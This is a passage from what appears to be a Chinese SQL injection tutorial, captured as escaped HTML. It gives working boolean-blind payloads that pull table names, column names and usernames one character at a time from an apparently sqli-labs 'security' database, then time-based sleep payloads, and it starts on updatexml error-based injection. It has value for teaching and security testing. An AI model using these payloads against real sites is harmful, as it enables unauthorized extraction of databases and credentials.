number&#34;&gt;97&lt;/span&gt;，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ord&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;97&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ASCII码表中可显示字符的范围是：&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;127&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆表名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 修改 1,1 前边的 1~20，逐字符猜解出第一个表的名&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;-- 修改 limit 的 0,1 前边的 0~20，逐个猜解每个表&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;查询第一个表的第一个字符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1 ),1,1)=&#34;b&#34; %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;security&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1 ),1,1)=&#34;e&#34; %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;第一个表名emails,接着查第二个&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;security&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;e&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 1,1 ),1,1)=&#34;r&#34; %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;以此类推爆破所有表&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;emails,referers,uagents,users&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆字段名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;security&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; table_name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;users&#34;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;r&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;报错&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%20 and substr((select column_name from information_schema.columns where table_schema=&#34;security&#34; and table_name=&#34;users&#34; limit 0,1 ),1,1)=&#34;i&#34; %23&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆出所有字段名&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;id,username.password&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;爆数据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id=1&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;d&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;?id&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&#39;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; username &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;u&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;正常&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;以此类推&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;可以用burp爆破功能爆破出所有数据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;嫌弃太慢也可以写脚本或者用sqlmap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;时间盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#时间盲注&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;时间盲注&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在 SQL 注入的方式 。&lt;/p&gt;
&lt;p&gt;可以用 benchmark，sleep 等造成延时效果的函数。&lt;/p&gt;
&lt;p&gt;如果 benkchmark 和 sleep 关键字被过滤了，可以让两个非常大的数据表做&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzYzNjQzL2FydGljbGUvZGV0YWlscy83OTE4NzkzMQ==&#34;&gt;笛卡尔积 (opens new window)&lt;/span&gt; 产生大量的计算从而产生时间延迟；&lt;/p&gt;
&lt;p&gt;或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。&lt;/p&gt;
&lt;p&gt;1、利用 sleep 判断数据库名长度&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token string&#34;&gt;&#39; and sleep(5) and 1=1--+	页面返回不正常，延时5秒&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--+	页面返回不正常，不延时&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;--if (条件表达式，真，假) --C 语言的三目运算符类似&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;2、获取数据库名&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;substr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;database&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;sleep&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;kbd&#34;&gt;报错注入&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;在 SQL 注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。&lt;/p&gt;
&lt;p&gt;常用的 MySQL 报错函数&lt;/p&gt;
&lt;h4 id=&#34;updatexml函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#updatexml函数&#34;&gt;#&lt;/a&gt; updatexml 函数&lt;/h4&gt;
&lt;p&gt;MySQL 的 UPDATEXML () 函数可以用于修改 XML 类型的数据，它可以更新 XML 数据中的一个或多个节点值。&lt;/p&gt;
&lt;p&gt;这个函数的参数有三个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XML 数据&lt;/li&gt;
&lt;li&gt;XPath 表达式：用于指定要修改的节点位置&lt;/li&gt;
&lt;li&gt;新的节点值：用于替换当前节点的值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是 UPDATEXML () 函数的语法：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;下面是UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;函数的语法：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;UPDATEXML&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;xml_target&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; xpath_expr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; new_val&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;其中，xml_target是要修改的XML类型的数据；xpath_expr是XPath表达式，用&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;于指定要修改的节点位置；new_val指定新的节点值。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;示例一：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;假设数据表中有以下的XML类型的数据：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;book&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;MySQL Basics&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;title&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;author&lt;span class=&#34;token 